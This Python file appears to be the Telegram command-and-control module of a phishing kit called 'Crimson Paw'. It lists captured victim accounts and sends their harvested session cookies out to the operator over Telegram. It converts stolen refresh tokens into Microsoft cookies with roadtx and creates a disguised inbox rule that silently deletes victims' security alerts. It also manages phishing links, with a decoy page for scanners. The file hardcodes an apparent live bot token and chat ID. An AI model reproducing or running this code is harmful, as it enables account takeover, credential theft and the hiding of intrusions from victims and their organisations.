# ── telegram_c2.py ──────────────────────────────────────────────────────────
# CRIMSON PAW: Interactive Two-Way Telegram Command & Control (C2) Bot Engine
# ────────────────────────────────────────────────────────────────────────────
import threading
import time
import json
import logging
import urllib.request
import urllib.parse
from pathlib import Path
from config import Config
import db
import graph

logger = logging.getLogger(__name__)

SETTINGS_FILE = Path(__file__).resolve().parent / 'settings.json'

def get_settings():
    if SETTINGS_FILE.exists():
        try:
            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {}

DEFAULT_BOT_TOKEN = '8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c'
DEFAULT_CHAT_ID = '7922291087'

class TelegramC2BotThread(threading.Thread):
    """
    Background worker that continuously polls the Telegram Bot API for incoming
    commands sent by the authenticated Master Administrator.
    """
    def __init__(self, poll_interval=3):
        super().__init__(daemon=True)
        self.poll_interval = poll_interval
        self.last_update_id = 0
        self.running = True

    def run(self):
        logger.info("[TELEGRAM-C2] Interactive Command & Control bot thread started.")
        while self.running:
            try:
                cfg = get_settings()
                bot_token = cfg.get('tg_bot_token', '').strip() or DEFAULT_BOT_TOKEN
                admin_chat_id = str(cfg.get('tg_chat_id', '')).strip() or DEFAULT_CHAT_ID

                if not bot_token or not admin_chat_id:
                    time.sleep(self.poll_interval)
                    continue

                # Long poll updates from Telegram
                updates = self._fetch_updates(bot_token)
                for update in updates:
                    update_id = update.get('update_id', 0)
                    if update_id >= self.last_update_id:
                        self.last_update_id = update_id + 1

                    # Handle regular text messages
                    if 'message' in update:
                        msg = update['message']
                        sender_chat_id = str(msg.get('chat', {}).get('id', '')).strip()

                        # Strict Security Authentication: Only accept from authorized admin_chat_id
                        if sender_chat_id != admin_chat_id:
                            continue

                        text = msg.get('text', '').strip()
                        if text.startswith('/'):
                            self._handle_command(bot_token, sender_chat_id, text)

                    # Handle interactive button clicks (Callback Queries)
                    elif 'callback_query' in update:
                        cb = update['callback_query']
                        cb_id = cb.get('id')
                        sender_chat_id = str(cb.get('message', {}).get('chat', {}).get('id', '')).strip()

                        if sender_chat_id != admin_chat_id:
                            continue

                        data = cb.get('data', '')
                        self._handle_callback(bot_token, sender_chat_id, cb_id, data)

            except Exception as e:
                logger.error(f"[TELEGRAM-C2] Error in polling loop: {e}")
                time.sleep(5)

            time.sleep(self.poll_interval)

    def _fetch_updates(self, bot_token):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/getUpdates?offset={self.last_update_id}&timeout=10"
            req = urllib.request.Request(url, headers={'User-Agent': 'CrimsonPaw-C2/2.0'})
            with urllib.request.urlopen(req, timeout=15) as res:
                if res.status == 200:
                    payload = json.loads(res.read().decode('utf-8'))
                    return payload.get('result', [])
        except Exception:
            pass
        return []

    def _send_text(self, bot_token, chat_id, text, reply_markup=None):
        try:
            data = {
                'chat_id': chat_id,
                'text': text,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            if reply_markup:
                data['reply_markup'] = reply_markup
            payload = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            logger.error(f"[TELEGRAM-C2] Failed to send message: {e}")

    def _send_document(self, bot_token, chat_id, file_bytes, filename, caption=''):
        try:
            boundary = '----CrimsonPawBoundary' + str(int(time.time()))
            body = []
            
            body.append(f'--{boundary}'.encode('utf-8'))
            body.append(f'Content-Disposition: form-data; name="chat_id"'.encode('utf-8'))
            body.append(''.encode('utf-8'))
            body.append(str(chat_id).encode('utf-8'))

            if caption:
                body.append(f'--{boundary}'.encode('utf-8'))
                body.append(f'Content-Disposition: form-data; name="caption"'.encode('utf-8'))
                body.append(''.encode('utf-8'))
                body.append(caption.encode('utf-8'))

            body.append(f'--{boundary}'.encode('utf-8'))
            body.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"'.encode('utf-8'))
            body.append('Content-Type: application/octet-stream'.encode('utf-8'))
            body.append(''.encode('utf-8'))
            body.append(file_bytes)

            body.append(f'--{boundary}--'.encode('utf-8'))
            body.append(''.encode('utf-8'))

            payload = b'\r\n'.join(body)
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{bot_token}/sendDocument",
                data=payload,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
            )
            urllib.request.urlopen(req, timeout=20)
        except Exception as e:
            logger.error(f"[TELEGRAM-C2] Failed to send document: {e}")

    def _answer_callback(self, bot_token, callback_query_id, text=''):
        try:
            payload = json.dumps({
                'callback_query_id': callback_query_id,
                'text': text
            }).encode('utf-8')
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{bot_token}/answerCallbackQuery",
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════════
    # Command Dispatcher
    # ═══════════════════════════════════════════════════════════════════════
    def _handle_command(self, bot_token, chat_id, full_cmd):
        parts = full_cmd.split()
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd in ('/start', '/help'):
            self._cmd_help(bot_token, chat_id)
        elif cmd == '/status':
            self._cmd_status(bot_token, chat_id)
        elif cmd == '/sessions':
            self._cmd_sessions(bot_token, chat_id)
        elif cmd == '/cookie':
            self._cmd_cookie(bot_token, chat_id, args)
        elif cmd == '/quarantine':
            self._cmd_quarantine(bot_token, chat_id, args)
        elif cmd == '/links':
            self._cmd_links(bot_token, chat_id)
        elif cmd == '/kill':
            self._cmd_kill(bot_token, chat_id, args)
        elif cmd == '/restore':
            self._cmd_restore(bot_token, chat_id, args)
        elif cmd == '/stats':
            self._cmd_stats(bot_token, chat_id)
        else:
            self._send_text(bot_token, chat_id, f"⚠️ Unknown command <code>{cmd}</code>. Type /help to see available commands.")

    def _handle_callback(self, bot_token, chat_id, cb_id, data):
        if not data:
            return
        if data.startswith('ck:'):
            uc = data.split(':', 1)[1]
            self._answer_callback(bot_token, cb_id, 'Generating RoadTX session cookie...')
            self._cmd_cookie(bot_token, chat_id, [uc])
        elif data.startswith('qr:'):
            uc = data.split(':', 1)[1]
            self._answer_callback(bot_token, cb_id, 'Deploying Silent Quarantine...')
            self._cmd_quarantine(bot_token, chat_id, [uc])
        elif data == 'refresh_sessions':
            self._answer_callback(bot_token, cb_id, 'Refreshing captured sessions...')
            self._cmd_sessions(bot_token, chat_id)

    # ═══════════════════════════════════════════════════════════════════════
    # Command Handlers
    # ═══════════════════════════════════════════════════════════════════════
    def _cmd_help(self, bot_token, chat_id):
        help_html = (
            "🦅 <b>CRIMSON PAW // TELEGRAM COMMAND CONTROLLER (C2)</b>\n"
            "<i>Interactive Remote Infrastructure Control Suite</i>\n\n"
            "<b>Session &amp; Token Commands:</b>\n"
            "• <code>/status</code> — Real-time server health, tokens &amp; shield metrics\n"
            "• <code>/sessions</code> — List latest captured victim accounts with 1-click actions\n"
            "• <code>/cookie &lt;user_code&gt;</code> — Harvest and download JSON/TXT session cookies\n"
            "• <code>/quarantine &lt;user_code&gt;</code> — Deploy silent security suppression rules\n\n"
            "<b>Campaign &amp; Link Armor:</b>\n"
            "• <code>/links</code> — View deployed active links and visitor counts\n"
            "• <code>/kill &lt;link_id&gt;</code> — Immediately kill link (divert scanners to 404)\n"
            "• <code>/restore &lt;link_id&gt;</code> — Restore a killed link to active status\n"
            "• <code>/stats</code> — Aggregate campaign conversion and interception metrics\n"
        )
        self._send_text(bot_token, chat_id, help_html)

    def _cmd_status(self, bot_token, chat_id):
        try:
            cfg = get_settings()
            sessions = db.get_captured_sessions()
            valid_tokens = [s for s in sessions if s.get('status') == 'CAPTURED']
            
            # Count audit logs
            audit_stats = db.get_operator_audit_stats() if hasattr(db, 'get_operator_audit_stats') else {}

            status_html = (
                "🛡️ <b>CRIMSON PAW PLATFORM TELEMETRY</b>\n\n"
                f"• <b>Platform Name:</b> {cfg.get('platform_name', 'CRIMSON PAW')}\n"
                f"• <b>Deploy Host:</b> <code>{cfg.get('deploy_host', '127.0.0.1:5000')}</code>\n"
                f"• <b>Active Theme:</b> <code>{cfg.get('theme', 'crimson')}</code>\n"
                f"• <b>Captured Victims:</b> <b>{len(valid_tokens)}</b> active enterprise accounts\n"
                f"• <b>Operator Audit Events:</b> <b>{audit_stats.get('total_events', 0)}</b> recorded\n"
                f"• <b>Shield Engine:</b> 🟢 Active (Cloudflare &amp; Anti-Bot Running)\n"
                f"• <b>Keyword Watcher:</b> 🟢 Polling Active (45s intervals)\n"
            )
            self._send_text(bot_token, chat_id, status_html)
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error fetching status: {e}")

    def _cmd_sessions(self, bot_token, chat_id):
        try:
            sessions = db.get_captured_sessions()
            if not sessions:
                self._send_text(bot_token, chat_id, "ℹ️ No captured victim sessions found in database.")
                return

            msg_lines = ["📋 <b>LATEST CAPTURED VICTIM ACCOUNTS:</b>\n"]
            inline_keyboard = []

            for idx, s in enumerate(sessions[:6], 1):
                email = s.get('victim_email') or s.get('account') or 'Unknown'
                uc = s.get('user_code')
                name = s.get('victim_name') or 'Corporate User'
                has_prt = "🔑 PRT" if s.get('prt') else "Token"

                msg_lines.append(
                    f"<b>#{idx} {email}</b>\n"
                    f"├ Name: <i>{name}</i>\n"
                    f"├ Code: <code>{uc}</code> ({has_prt})\n"
                    f"└ Status: <b>{s.get('status')}</b>\n"
                )

                inline_keyboard.append([
                    {'text': f"🍪 Cookie ({uc})", 'callback_data': f"ck:{uc}"},
                    {'text': f"🛡️ Quarantine", 'callback_data': f"qr:{uc}"}
                ])

            inline_keyboard.append([
                {'text': "🔄 Refresh List", 'callback_data': "refresh_sessions"}
            ])

            self._send_text(
                bot_token,
                chat_id,
                "\n".join(msg_lines),
                reply_markup={'inline_keyboard': inline_keyboard}
            )
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error fetching sessions: {e}")

    def _cmd_cookie(self, bot_token, chat_id, args):
        if not args:
            self._send_text(bot_token, chat_id, "⚠️ Usage: <code>/cookie &lt;user_code&gt;</code>\nExample: <code>/cookie ABC123XYZ</code>")
            return

        uc = args[0].strip()
        s = db.get_session_by_user_code(uc)
        if not s:
            self._send_text(bot_token, chat_id, f"⚠️ No session found matching user_code <code>{uc}</code>.")
            return

        self._send_text(bot_token, chat_id, f"⏳ Generating RoadTX session cookie for <code>{s.get('victim_email') or uc}</code>...")

        try:
            # Check for existing cookie on disk
            cookie_path = Path(__file__).resolve().parent / 'victims' / uc / 'cookie.json'
            if not cookie_path.exists():
                cookie_path = Path(__file__).resolve().parent / 'victims' / uc / 'cookies.txt'

            cookie_bytes = None
            filename = f"cookie_{uc}.json"

            if cookie_path.exists():
                cookie_bytes = cookie_path.read_bytes()
            else:
                # Trigger roadtx cookie extraction if PRT exists
                prt_file = Path(__file__).resolve().parent / 'victims' / uc / 'roadtx.prt'
                if prt_file.exists():
                    import subprocess
                    cmd = f'roadtx prtcookie -f "{prt_file}" -c msteams'
                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
                    if proc.stdout and ('ESTS' in proc.stdout or 'KMSI' in proc.stdout or '{' in proc.stdout):
                        cookie_bytes = proc.stdout.encode('utf-8')
                        filename = f"roadtx_cookie_{uc}.txt"

            if cookie_bytes:
                caption = f"🍪 Session Cookie harvested for {s.get('victim_email') or uc}\nReady for browser injection."
                self._send_document(bot_token, chat_id, cookie_bytes, filename, caption=caption)
            else:
                self._send_text(bot_token, chat_id, f"⚠️ Could not generate fresh cookie for <code>{uc}</code>. PRT assertion may need refresh.")
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Cookie generation error: {e}")

    def _cmd_quarantine(self, bot_token, chat_id, args):
        if not args:
            self._send_text(bot_token, chat_id, "⚠️ Usage: <code>/quarantine &lt;user_code&gt;</code>")
            return

        uc = args[0].strip()
        s = db.get_session_by_user_code(uc)
        if not s or s.get('status') != 'CAPTURED':
            self._send_text(bot_token, chat_id, f"⚠️ Session <code>{uc}</code> is not in CAPTURED state.")
            return

        token = db.get_graph_access_token(s)
        if not token:
            self._send_text(bot_token, chat_id, f"⚠️ Unable to obtain valid Graph access token for <code>{uc}</code>.")
            return

        rule_payload = {
            'displayName': 'Microsoft System Compliance Interceptor',
            'sequence': 1,
            'isEnabled': True,
            'conditions': {
                'subjectContains': [
                    'security alert', 'unusual sign-in', 'password reset', 'verification code',
                    'phish', 'suspicious', 'mfa', 'defender', 'quarantine', 'identity verification'
                ]
            },
            'actions': {
                'moveToFolder': 'deleteditems',
                'markAsRead': True,
                'stopProcessingRules': True
            }
        }

        try:
            res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', token, method='POST', payload=rule_payload)
            if res and not res.get('error'):
                self._send_text(
                    bot_token,
                    chat_id,
                    f"🛡️ <b>Silent Quarantine Deployed!</b>\n\n"
                    f"• <b>Victim:</b> {s.get('victim_email') or uc}\n"
                    f"• <b>Rule Name:</b> <code>Microsoft System Compliance Interceptor</code>\n"
                    f"• <b>Action:</b> Security alerts routed silently into Deleted Items + Marked as Read."
                )
            else:
                err_msg = res.get('error', {}).get('message') if res else 'Unknown Graph API error'
                self._send_text(bot_token, chat_id, f"⚠️ Graph API failed to deploy quarantine rule: {err_msg}")
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Quarantine error: {e}")

    def _cmd_links(self, bot_token, chat_id):
        try:
            import deployments
            deps = deployments.get_deployments() if hasattr(deployments, 'get_deployments') else []
            if not deps:
                self._send_text(bot_token, chat_id, "ℹ️ No deployed campaign links found.")
                return

            lines = ["🔗 <b>ACTIVE CAMPAIGN DEPLOYMENTS:</b>\n"]
            for d in deps[:8]:
                st_icon = "🟢" if d.get('status') == 'active' else "🔴"
                lines.append(
                    f"{st_icon} <b>Link #{d.get('id')}:</b> /{d.get('slug')}\n"
                    f"├ Landing: <i>{d.get('land_name', 'DocuSign')}</i>\n"
                    f"├ Visits: <b>{d.get('visits', 0)}</b> | Captures: <b>{d.get('captures', 0)}</b>\n"
                    f"└ Status: <code>{d.get('status')}</code> (Kill: <code>/kill {d.get('id')}</code>)\n"
                )

            self._send_text(bot_token, chat_id, "\n".join(lines))
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error listing links: {e}")

    def _cmd_kill(self, bot_token, chat_id, args):
        if not args:
            self._send_text(bot_token, chat_id, "⚠️ Usage: <code>/kill &lt;link_id&gt;</code>")
            return
        lid = args[0].strip()
        try:
            import deployments
            if hasattr(deployments, 'set_deployment_status'):
                deployments.set_deployment_status(lid, 'killed')
                self._send_text(bot_token, chat_id, f"🚨 <b>LINK #{lid} KILLED!</b>\nTraffic will immediately receive the stealth 404 decoy page.")
            else:
                self._send_text(bot_token, chat_id, f"⚠️ set_deployment_status method not available.")
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error killing link #{lid}: {e}")

    def _cmd_restore(self, bot_token, chat_id, args):
        if not args:
            self._send_text(bot_token, chat_id, "⚠️ Usage: <code>/restore &lt;link_id&gt;</code>")
            return
        lid = args[0].strip()
        try:
            import deployments
            if hasattr(deployments, 'set_deployment_status'):
                deployments.set_deployment_status(lid, 'active')
                self._send_text(bot_token, chat_id, f"✓ <b>Link #{lid} Restored!</b>\nCampaign link is live and accepting visitor traffic.")
            else:
                self._send_text(bot_token, chat_id, f"⚠️ set_deployment_status method not available.")
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error restoring link #{lid}: {e}")

    def _cmd_stats(self, bot_token, chat_id):
        try:
            sessions = db.get_captured_sessions()
            valid_tokens = [s for s in sessions if s.get('status') == 'CAPTURED']
            
            # Fetch global hits
            total_hits = 0
            blocked_bots = 0
            try:
                import sqlite3
                conn = sqlite3.connect(Config.DB_PATH)
                r_hits = conn.execute("SELECT sum(visits), sum(captures) FROM deployments").fetchone()
                total_hits = r_hits[0] or 0
                conn.close()
            except Exception:
                pass

            stats_msg = (
                "📊 <b>CRIMSON PAW // AGGREGATE CAMPAIGN STATS</b>\n\n"
                f"• <b>Total Link Visits:</b> <b>{total_hits}</b>\n"
                f"• <b>Enterprise Captures:</b> <b>{len(valid_tokens)}</b> accounts\n"
                f"• <b>Conversion Rate:</b> <b>{(len(valid_tokens)/max(1, total_hits))*100:.1f}%</b>\n"
                f"• <b>Anti-Bot Shield:</b> Active (Silent deflection enforced)\n"
            )
            self._send_text(bot_token, chat_id, stats_msg)
        except Exception as e:
            self._send_text(bot_token, chat_id, f"⚠️ Error fetching stats: {e}")
